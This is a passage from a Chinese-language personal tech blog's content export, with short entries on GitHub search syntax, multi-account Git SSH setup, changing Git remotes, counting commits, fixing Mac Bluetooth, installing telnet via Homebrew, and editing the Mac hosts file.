      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>如何在Github中搜索特殊字符</title>
    <url>/nirvana/git/git/git-seach-special-char/</url>
    <content><![CDATA[<p>github仓库中搜索包含特殊字符的字符串(例如” example.com”或” Example：”)</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>使用空格代替字符，然后将搜索词放在引号中。 它会给您最接近的结果。<br>我有一个库调用sg.createNode，所以我搜索了”sg createNote”，其中大多数返回的结果包括sg.createNote。</p>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-e3184421d579a0d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>暂时没有找到能够精准匹配特殊字符的方法，但是已经基本够用了</p>
</blockquote>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>GitHub 常用搜索语法</title>
    <url>/nirvana/git/git/git-seach/</url>
    <content><![CDATA[<p><strong><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-for-repositories">官网</a></strong></p>
<h1 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a>搜索仓库</h1><p>您可以在 GitHub 上搜索仓库，并使用这些仓库搜索限定符的任意组合缩小结果范围。<br>您可以在所有 GitHub 内全局搜索仓库，也可以在特定组织内搜索仓库<br>要在搜索结果中包括复刻，您需要将 <code>fork:true</code> 或 <code>fork:only</code> 添加到查询。 </p>
<p><strong>Tips:</strong></p>
<ul>
<li>  有关可以添加到任何搜索限定符以进一步改善结果的搜索语法列表，请参阅“<a href="https://docs.github.com/cn/free-pro-team@latest/articles/understanding-the-search-syntax">了解搜索语法</a>”。</li>
<li>  对多个字词的搜索词使用引号。 例如，如果要搜索具有标签 “In progress” 的议题，可搜索 <code>label:&quot;in progress&quot;</code>。 搜索不区分大小写。</li>
</ul>
<h3 id="按仓库名称、说明或自述文件内容搜索"><a href="#按仓库名称、说明或自述文件内容搜索" class="headerlink" title="按仓库名称、说明或自述文件内容搜索"></a>按仓库名称、说明或自述文件内容搜索</h3><p>通过 <code>in</code> 限定符，您可以将搜索限制为仓库名称、仓库说明、自述文件内容或这些的任意组合。 如果省略此限定符，则只搜索仓库名称和说明。</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>in:name</code></td>
<td><strong>jquery in:name</strong> matches repositories with “jquery” in the repository name.</td>
</tr>
<tr>
<td><code>in:description</code></td>
<td><strong>jquery in:name,description</strong> matches repositories with “jquery” in the repository name or description.</td>
</tr>
<tr>
<td><code>in:readme</code></td>
<td><strong>jquery in:readme</strong>  matches repositories mentioning “jquery” in the repository’s README file.</td>
</tr>
<tr>
<td><code>repo:owner/name</code></td>
<td><strong>repo:octocat/hello-world</strong> 匹配特定仓库名称。</td>
</tr>
</tbody></table>
<h3 id="基于仓库的内容搜索"><a href="#基于仓库的内容搜索" class="headerlink" title="基于仓库的内容搜索"></a>基于仓库的内容搜索</h3><p>除了使用 <code>in:readme</code> 以外，无法通过搜索仓库内的特定内容来查找仓库。 要搜索仓库内的特定文件或内容，您可以使用查找器或代码特定的搜索限定符。<br>| 限定符 | 示例 |<br>| — | — |<br>| <code>in:readme</code> | <strong>octocat in:readme</strong> matches repositories mentioning “octocat” in the repository’s README file. |</p>
<h3 id="在用户或组织的仓库内搜索"><a href="#在用户或组织的仓库内搜索" class="headerlink" title="在用户或组织的仓库内搜索"></a>在用户或组织的仓库内搜索</h3><p>要在特定用户或组织拥有的所有仓库中搜索，您可以使用 <code>user</code> 或 <code>org</code> 限定符。</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>user:*USERNAME*</code></td>
<td><strong>user:defunkt forks:&gt;100</strong> 匹配来自 @defunkt、拥有超过 100 复刻的仓库。</td>
</tr>
<tr>
<td><code>org:*ORGNAME*</code></td>
<td><strong>org:github</strong> 匹配来自 GitHub 的仓库。</td>
</tr>
</tbody></table>
<h3 id="按仓库大小搜索"><a href="#按仓库大小搜索" class="headerlink" title="按仓库大小搜索"></a>按仓库大小搜索</h3><p>The <code>size</code> qualifier finds repositories that match a certain size (in kilobytes), using greater than, less than, and range qualifiers<br>| 限定符 | 示例 |<br>| — | — |<br>| <code>size:*n*</code> | <strong>size:1000</strong> 匹配恰好为 1 MB 的仓库。 |<br>|  | <strong>size:&gt;=30000</strong> 匹配至少为 30 MB 的仓库。 |<br>|  | <strong>size:&lt;50</strong> 匹配小于 50 KB 的仓库。 |<br>|  | <strong>size:50..120</strong> 匹配介于 50 KB 与 120 KB 之间的仓库。 |</p>
<h3 id="按关注者数量搜索"><a href="#按关注者数量搜索" class="headerlink" title="按关注者数量搜索"></a>按关注者数量搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>followers:*n*</code></td>
<td><strong>node followers:&gt;=10000</strong> 匹配有 10,000 或更多关注者提及文字 “node” 的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>styleguide linter followers:1..10</strong> 匹配拥有 1 到 10 个关注者并且提及 “styleguide linter” 一词的的仓库。</td>
</tr>
</tbody></table>
<h3 id="按复刻数量搜索"><a href="#按复刻数量搜索" class="headerlink" title="按复刻数量搜索"></a>按复刻数量搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>forks:*n*</code></td>
<td><strong>forks:5</strong> 匹配具有至少 205 个复刻的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>forks:&lt;90</strong> 匹配具有少于 90 个复刻的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>forks:10..20</strong> 匹配具有 10 到 20 个复刻的仓库。</td>
</tr>
</tbody></table>
<h3 id="按星号数量搜索"><a href="#按星号数量搜索" class="headerlink" title="按星号数量搜索"></a>按星号数量搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>stars:*n*</code></td>
<td><strong>stars:500</strong> 匹配恰好具有 500 个星号的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>stars:10..20</strong> 匹配具有 10 到 20 个星号、小于 1000 KB 的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>stars:&gt;=500 fork:true language:php</strong> 匹配具有至少 500 个星号，包括复刻的星号（以 PHP 编写）的仓库。</td>
</tr>
</tbody></table>
<h3 id="按仓库创建或上次更新时间搜索"><a href="#按仓库创建或上次更新时间搜索" class="headerlink" title="按仓库创建或上次更新时间搜索"></a>按仓库创建或上次更新时间搜索</h3><p>您可以基于创建时间或上次更新时间过滤仓库。 对于仓库创建，您可以使用 <code>created</code> 限定符；要了解仓库上次更新的时间，您要使用 <code>pushed</code> 限定符。 <code>pushed</code> 限定符将返回仓库列表，按仓库中任意分支上最近进行的提交排序。</p>
<p>两者均采用日期作为参数。 日期格式必须遵循 <a href="http://en.wikipedia.org/wiki/ISO_8601">ISO8601</a>标准，即 <code>YYYY-MM-DD</code>（年-月-日）。 您也可以在日期后添加可选的时间信息 <code>THH:MM:SS+00:00</code>，以便按小时、分钟和秒进行搜索。 这是 <code>T</code>，随后是 <code>HH:MM:SS</code>（时-分-秒）和 UTC 偏移 (<code>+00:00</code>)。</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>created:*YYYY-MM-DD*</code></td>
<td><strong>webos created:&lt;2011-01-01</strong> 匹配具有 “webos” 字样、在 2011 年之前创建的仓库。</td>
</tr>
<tr>
<td><code>pushed:*YYYY-MM-DD*</code></td>
<td><strong>css pushed:&gt;2013-02-01</strong> 匹配具有 “css” 字样、在 2013 年 1 月之后收到推送的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>case pushed:&gt;=2013-03-06 fork:only</strong> 匹配具有 “case” 字样、在 2013 年 3 月 6 日或之后收到推送并且作为复刻的仓库。</td>
</tr>
</tbody></table>
<h3 id="按语言搜索"><a href="#按语言搜索" class="headerlink" title="按语言搜索"></a>按语言搜索</h3><p>You can search repositories based on the language of the code in the repositories.</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>language:*LANGUAGE*</code></td>
<td><strong>rails language:javascript</strong> 匹配具有 “rails” 字样、以 JavaScript 编写的仓库。</td>
</tr>
</tbody></table>
<h3 id="按主题搜索"><a href="#按主题搜索" class="headerlink" title="按主题搜索"></a>按主题搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>topic:*TOPIC*</code></td>
<td><strong>topic:jekyll</strong> 匹配已归类为 “jekyll” 主题的仓库。</td>
</tr>
</tbody></table>
<h3 id="按主题数量搜索"><a href="#按主题数量搜索" class="headerlink" title="按主题数量搜索"></a>按主题数量搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>topics:*n*</code></td>
<td><strong>topics:5</strong> 匹配具有五个主题的仓库。</td>
</tr>
<tr>
<td></td>
<td><strong>topics:&gt;3</strong>  匹配超过三个主题的仓库。</td>
</tr>
</tbody></table>
<h3 id="按许可搜索"><a href="#按许可搜索" class="headerlink" title="按许可搜索"></a>按许可搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>license:*LICENSE_KEYWORD*</code></td>
<td><strong>license:apache-2.0</strong>  匹配根据 Apache License 2.0 授权的仓库。</td>
</tr>
</tbody></table>
<h3 id="Search-by-repository-visibility"><a href="#Search-by-repository-visibility" class="headerlink" title="Search by repository visibility"></a>Search by repository visibility</h3><p>You can filter your search based on the visibility of the repositories. </p>
<table>
<thead>
<tr>
<th>Qualifier</th>
<th>Example</th>
</tr>
</thead>
<tbody><tr>
<td><code>is:public</code></td>
<td><strong>is:public org:github</strong>  matches public repositories owned by GitHub.</td>
</tr>
<tr>
<td><code>is:internal</code></td>
<td><strong>is:internal test</strong> matches internal repositories that you can access and contain the word “test”.</td>
</tr>
<tr>
<td><code>is:private</code></td>
<td><strong>is:private pages</strong>  matches private repositories that you can access and contain the word “pages.”</td>
</tr>
</tbody></table>
<h3 id="基于仓库是否为镜像搜索"><a href="#基于仓库是否为镜像搜索" class="headerlink" title="基于仓库是否为镜像搜索"></a>基于仓库是否为镜像搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>mirror:true</code></td>
<td><strong>mirror:true GNOME</strong>  matches repositories that are mirrors and contain the word “GNOME.”</td>
</tr>
<tr>
<td><code>mirror:false</code></td>
<td><strong>mirror:false GNOME</strong>  matches repositories that are not mirrors and contain the word “GNOME.”</td>
</tr>
</tbody></table>
<h3 id="基于仓库是否已存档搜索"><a href="#基于仓库是否已存档搜索" class="headerlink" title="基于仓库是否已存档搜索"></a>基于仓库是否已存档搜索</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>archived:true</code></td>
<td><strong>archived:true GNOME</strong>  matches repositories that are archived and contain the word “GNOME.”</td>
</tr>
<tr>
<td><code>archived:false</code></td>
<td><strong>archived:false GNOME</strong> matches repositories that are not archived and contain the word “GNOME.”</td>
</tr>
</tbody></table>
<h3 id="基于具有-good-first-issue-或-help-wanted-标签的议题数量搜索"><a href="#基于具有-good-first-issue-或-help-wanted-标签的议题数量搜索" class="headerlink" title="基于具有 good first issue 或 help wanted 标签的议题数量搜索"></a>基于具有 <code>good first issue</code> 或 <code>help wanted</code> 标签的议题数量搜索</h3><p>您可以使用限定符 <code>help-wanted-issues:&gt;n</code> 和 <code>good-first-issues:&gt;n</code> 搜索具有最少数量标签为 <code>help-wanted</code> 或 <code>good-first-issue</code> 议题的仓库。。</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>good-first-issues:&gt;n</code></td>
<td><strong>good-first-issues:&gt;2 javascript</strong>  匹配具有超过两个标签为 <code>good-first-issue</code> 的议题且包含 “javascript” 字样的仓库。</td>
</tr>
<tr>
<td><code>help-wanted-issues:&gt;n</code></td>
<td><strong>help-wanted-issues:&gt;4 react</strong>  匹配具有超过四个标签为 <code>help-wanted</code> 的议题且包含 “React” 字样的仓库。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Git多账号配置</title>
    <url>/nirvana/git/git/git-users-set/</url>
    <content><![CDATA[<h3 id="一、如何生成ssh密钥"><a href="#一、如何生成ssh密钥" class="headerlink" title="一、如何生成ssh密钥"></a>一、如何生成ssh密钥</h3><h4 id="1-1-设置Git的user-name和user-email"><a href="#1-1-设置Git的user-name和user-email" class="headerlink" title="1.1 设置Git的user.name和user.email"></a>1.1 设置Git的user.name和user.email</h4><p>为了生成多账户，这里展示的局部的git配置，并不是全局的账户配置(全局配置：在config后面加上–list)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;github账号</span><br><span class="line">$ git config user.name &quot;zhangsan&quot;</span><br><span class="line">$ git config user.email &quot;zhangsan@gmail.com&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;gitlab账号</span><br><span class="line">$ git config user.name &quot;zhangsan&quot;</span><br><span class="line">$ git config user.email &quot;zhangsan@qq.com&quot;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-生成SSH密钥"><a href="#1-2-生成SSH密钥" class="headerlink" title="1.2 生成SSH密钥"></a>1.2 生成SSH密钥</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;github账号</span><br><span class="line">$ ssh-keygen -t rsa -C “zhangsan@gmail.com”</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;gitlab账号</span><br><span class="line">$ ssh-keygen -t rsa -C “zhangsan@qq.com”</span><br></pre></td></tr></table></figure>

<p>文件命名后，按2次回车，密码为空。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in &#x2F;Users&#x2F;zhangsan&#x2F;.ssh&#x2F;github_id_rsa.</span><br><span class="line">Your public key has been saved in &#x2F;Users&#x2F;zhangsan&#x2F;.ssh&#x2F;github_id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:mRAluu98izlMRIQhaezphUvRHnkEH5HFm+aAX6wtXBU zhangsan@gmail.com</span><br><span class="line">The key&#39;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">| ..ooBB*o E.     |</span><br><span class="line">|  &#x3D;.&#x3D;o++. .      |</span><br><span class="line">| o &#x3D;.&#x3D;o. +       |</span><br><span class="line">|  &#x3D; +.o.Bo       |</span><br><span class="line">| o o.+ OS        |</span><br><span class="line">|  o  .* o        |</span><br><span class="line">|     o..         |</span><br><span class="line">|     ooo.        |</span><br><span class="line">|      &#x3D;o..       |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将上面ssh密钥生成步骤重复一次，最后得到四个文件：github_id_rsa、github_id_rsa.pub和gitlab_id_rsa、gitlab_id_rsa.pub</p>
<h3 id="二、多账号配置"><a href="#二、多账号配置" class="headerlink" title="二、多账号配置"></a>二、多账号配置</h3><p>在~/.ssh目录下，增加config配置文件(注：无后缀名)，配置规范如下(可配置多个git账号):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Host host（Host简称，使用命令ssh host可连接远程服务器，如：ssh github）</span><br><span class="line">  #User&#x2F;Email 登录用户名(如：zhangsan&#x2F;zhangsan@gmail.com)</span><br><span class="line">  #HostName 主机名用ip或域名，建议使用域名(如:github.com)</span><br><span class="line">  #Port 服务器open-ssh端口（默认：22,默认时一般不写此行</span><br><span class="line">  #IdentityFile 证书文件路径（如~&#x2F;.ssh&#x2F;id_rsa_*)</span><br></pre></td></tr></table></figure>

<p>接下来，举个具体的栗子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#github zhangsan@gmail.com</span><br><span class="line">host github</span><br><span class="line">    Hostname github.com</span><br><span class="line">    User zhangsan</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;github_id_rsa</span><br><span class="line"></span><br><span class="line">#gitlab zhangsan@qq.com</span><br><span class="line">host gitlab</span><br><span class="line">    Hostname gitlab.*.com</span><br><span class="line">    User zhangsan</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;gitlab_id_rsa</span><br></pre></td></tr></table></figure>

<p>注意事项：</p>
<ul>
<li>在配置文件中的，IdentityFile文件位置是rsa私钥，不是.pub公钥</li>
<li>push代码的时候注意下，得check下本的user.name和user.email,若没有进行生成操作。建议最好设置一个全局的user.name和user.email,然后需要特定的配置的git仓库，就单独配置(当前配置查询命令:$ git config –list)</li>
</ul>
<h3 id="三、ssh-add增加新的私钥"><a href="#三、ssh-add增加新的私钥" class="headerlink" title="三、ssh-add增加新的私钥"></a>三、ssh-add增加新的私钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;github账号</span><br><span class="line">$ ssh-add ~&#x2F;.ssh&#x2F;github_id_rsa</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;gitlab账号</span><br><span class="line">$ ssh-add ~&#x2F;.ssh&#x2F;gitlab_id_rsa</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该命令如果报错：Could not open a connection to your authentication agent.无法连接到ssh agent，可执行ssh-agent bash命令后再执行ssh-add命令。</p>
</blockquote>
<p>上面的配置完成完成，使用命令ssh-add -l可以看到所有的密钥列表,ssh-add的作用主要将密钥添加到 ssh-agent 的高速缓存中，这样在当前会话中就不需要再次输入密码了<br>具体的可以参考<a href="https://wiki.archlinux.org/index.php/SSH_keys_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29">SSH Keys</a></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>git 修改仓库地址</title>
    <url>/nirvana/git/git/git%E4%BF%AE%E6%94%B9%E4%BB%93%E5%BA%93%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<h2 id="1、-通过命令直接修改远程地址"><a href="#1、-通过命令直接修改远程地址" class="headerlink" title="1、 通过命令直接修改远程地址"></a>1、 通过命令直接修改远程地址</h2> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;进入git_test根目录</span><br><span class="line">git remote 查看所有远程仓库， git remote xxx 查看指定远程仓库地址</span><br><span class="line">git remote set-url origin http:&#x2F;&#x2F;******.git</span><br></pre></td></tr></table></figure>
<h2 id="2、-通过命令先删除再添加远程仓库"><a href="#2、-通过命令先删除再添加远程仓库" class="headerlink" title="2、 通过命令先删除再添加远程仓库"></a>2、 通过命令先删除再添加远程仓库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;进入git_test根目录</span><br><span class="line">git remote 查看所有远程仓库， git remote xxx 查看指定远程仓库地址</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin http:&#x2F;&#x2F;********.git</span><br></pre></td></tr></table></figure>
<h2 id="3、方法三-直接修改配置文件"><a href="#3、方法三-直接修改配置文件" class="headerlink" title="3、方法三 直接修改配置文件"></a>3、方法三 直接修改配置文件</h2><pre><code>//进入git_test/.git
vim config
[core]
repositoryformatversion = 0
filemode = true
logallrefupdates = true
precomposeunicode = true
[remote &quot;origin&quot;]
url = http://****.git
fetch = +refs/heads/*:refs/remotes/origin/*
[branch &quot;master&quot;]
remote = origin
merge = refs/heads/master

修改 [remote “origin”]下面的url即可
</code></pre>
<h2 id="4、-通过第三方git客户端修改。"><a href="#4、-通过第三方git客户端修改。" class="headerlink" title="4、 通过第三方git客户端修改。"></a>4、 通过第三方git客户端修改。</h2><p>以SourceTree为例，点击 仓库 -&gt; 仓库配置 -&gt; 远程仓库 即可管理此项目中配置的所有远程仓库， 而且这个界面最下方还可以点击编辑配置文件，同样可以完成方法三。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Git统计每个人提交的Commit次数和代码行数</title>
    <url>/nirvana/git/git/gitCount/</url>
    <content><![CDATA[<p>提交次<code>git shortlog --numbered --summary</code><br>查看所有的<code>commit数git log --oneline | wc -l</code><br>提交删除行数<code>git log --author=&quot;$(git config --get user.name)&quot; --pretty=tformat: --numstat | awk &#39;&#123; add += $1 ; subs += $2 ; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s removed lines : %s total lines: %s\n&quot;,add,subs,loc &#125;&#39;</code><br>使用cloc统计代码行数给力：<br>安装<code>brew install cloc</code><br>统计目录下的所有文件，代码行数<code>cloc ./</code><br>排除文件夹<code>cloc ./ --exclude-dir=Pods,Tests,Utility</code></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>MAC-蓝牙问题解决加强版(-Airdrop-找不到,-蓝牙找不到等-)</title>
    <url>/nirvana/mac/mac/MAC-%E8%93%9D%E7%89%99%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%A0%E5%BC%BA%E7%89%88(-Airdrop-%E6%89%BE%E4%B8%8D%E5%88%B0,-%E8%93%9D%E7%89%99%E6%89%BE%E4%B8%8D%E5%88%B0%E7%AD%89-)/</url>
    <content><![CDATA[<p>如果你电脑出现了比如经常丢链接, 或者Hand off 不工作, Airdrop 找不到的话, 先升级到10.11.2 系统, 应该能解决很多已存的Bug.</p>
<p>如果依然没有解决的话, 首先你可以先去删除bluetooth的配置文件. <br>在</p>
<p>/Library/Preferences/</p>
<p>目录里. </p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-5917f0bfaef81518.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="正在搜索“Preferences”.jpg"></p>
<p>按 Command-shift-G , 找到后搜索 blue 就行了. </p>
<p>删除后重启, 蓝牙配置就会重置了.  也可以尝试重启的时候按住 Command-Option-p-r 三声后松手, 也就是俗称的PR大法. 清理PR缓存. </p>
<p>–</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>Mac-OS-安装-Telnet</title>
    <url>/nirvana/mac/mac/Mac-OS-%E5%AE%89%E8%A3%85-Telnet/</url>
    <content><![CDATA[<p>使用 homebrew 安装telnet：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install telnet</span><br></pre></td></tr></table></figure>
<p>安装报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew install telnet</span><br><span class="line">Error: &#x2F;usr&#x2F;local&#x2F;Cellar is not writable. You should change the</span><br><span class="line">ownership and permissions of &#x2F;usr&#x2F;local&#x2F;Cellar back to your</span><br><span class="line">user account:</span><br><span class="line">  sudo chown -R $(whoami) &#x2F;usr&#x2F;local&#x2F;Cellar</span><br><span class="line">Warning: You are using macOS 10.15.</span><br><span class="line">We do not provide support for this pre-release version.</span><br><span class="line">You will encounter build failures with some formulae.</span><br><span class="line">Please create pull requests instead of asking for help on Homebrew&#39;s GitHub,</span><br><span class="line">Discourse, Twitter or IRC. You are responsible for resolving any issues you</span><br><span class="line">experience, as you are running this pre-release version.</span><br><span class="line"></span><br><span class="line">Error: The following directories are not writable by your user:</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;Cellar</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;Homebrew</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc&#x2F;bash_completion.d</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;opt</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;var&#x2F;homebrew&#x2F;linked</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;var&#x2F;homebrew&#x2F;locks</span><br><span class="line"></span><br><span class="line">You should change the ownership of these directories to your user.</span><br><span class="line">  sudo chown -R $(whoami) &#x2F;usr&#x2F;local&#x2F;Cellar &#x2F;usr&#x2F;local&#x2F;Homebrew &#x2F;usr&#x2F;local&#x2F;etc &#x2F;usr&#x2F;local&#x2F;etc&#x2F;bash_completion.d &#x2F;usr&#x2F;local&#x2F;opt &#x2F;usr&#x2F;local&#x2F;var&#x2F;homebrew&#x2F;linked &#x2F;usr&#x2F;local&#x2F;var&#x2F;homebrew&#x2F;locks</span><br></pre></td></tr></table></figure>
<p>说明你当前用户权限不对，需要sudo权限执行命令，增加用户权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chown -R $(whoami) &#x2F;usr&#x2F;local&#x2F;Cellar &#x2F;usr&#x2F;local&#x2F;Homebrew &#x2F;usr&#x2F;local&#x2F;etc </span><br></pre></td></tr></table></figure>
<p>重新安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew install telnet</span><br><span class="line">Warning: You are using macOS 10.15.</span><br><span class="line">We do not provide support for this pre-release version.</span><br><span class="line">You will encounter build failures with some formulae.</span><br><span class="line">Please create pull requests instead of asking for help on Homebrew&#39;s GitHub,</span><br><span class="line">Discourse, Twitter or IRC. You are responsible for resolving any issues you</span><br><span class="line">experience, as you are running this pre-release version.</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt; Downloading https:&#x2F;&#x2F;opensource.apple.com&#x2F;tarballs&#x2F;remote_cmds&#x2F;remote_cmds-60</span><br><span class="line">######################################################################## 100.0%</span><br><span class="line">&#x3D;&#x3D;&gt; Downloading https:&#x2F;&#x2F;opensource.apple.com&#x2F;tarballs&#x2F;libtelnet&#x2F;libtelnet-13.tar</span><br><span class="line">######################################################################## 100.0%</span><br><span class="line">&#x3D;&#x3D;&gt; xcodebuild SYMROOT&#x3D;build -arch x86_64</span><br><span class="line">&#x3D;&#x3D;&gt; make -C telnet.tproj OBJROOT&#x3D;build&#x2F;Intermediates SYMROOT&#x3D;build&#x2F;Products DSTR</span><br><span class="line">🍺  &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;telnet&#x2F;60: 4 files, 142.3KB, built in 21 seconds</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;brew cleanup&#96; has not been run in 30 days, running now...</span><br></pre></td></tr></table></figure>
<p>执行telnet ip port命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ telnet baidu.com 443</span><br><span class="line">Trying 220.181.38.148...</span><br><span class="line">Connected to baidu.com.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line">^</span><br><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: bfe&#x2F;1.0.8.18</span><br><span class="line">Date: Mon, 08 Feb 2021 02:31:59 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 161</span><br><span class="line">Connection: close</span><br><span class="line">Location: http:&#x2F;&#x2F;www.baidu.com&#x2F;error.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body bgcolor&#x3D;&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;bfe&#x2F;1.0.8.18&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>Mac-四种修改Hosts的方法</title>
    <url>/nirvana/mac/mac/Mac-%E5%9B%9B%E7%A7%8D%E4%BF%AE%E6%94%B9Hosts%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>　　1、通过 VI 编辑器修改</p>
<p>　　打开终端（应用程序——实用工具），运行：</p>
<p>　　sudo vi /etc/hosts</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-67eb013c22cf36b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　屏幕上会提示你输入密码（输入密码的时候不会有任何字符显示，甚至*都不会显示，输完之后按回车就是了），打开 hosts 文件之后按 i 键进入插入模式（可理解为编辑模式，如下图所示，会有「INSERT 」提示，即可插入编辑的意思），然后按照你的需要对该文件进行编辑，编辑完成之后按 ESC 键退出插入模式，之后按「 :wq+回车」保存退出，记得英文的冒号也是要输入的哦。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3e19c469c281313b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　VI 编辑器对于经常使用 Linux 的用户应该不会陌生，而且该编辑器是默认内置在 Mac 系统中的。但是，对于没有使用过 VI 的用户，还真得花一会儿功夫来学习其基本使用方法。另外VI编辑器是一个很好很强大的工具，想要玩好 Mac 的话，最好掌握这个工具的使用。</p>
<p>　　2、直接在 Mac 系统下找到 Hosts 文件修改</p>
<p>　　这应该算是最简单以及最直观的一个修改方法了。</p>
<p>　　第一步、打开你的文件管理器也就是Finder ，Hosts自然也是在这个里面。</p>
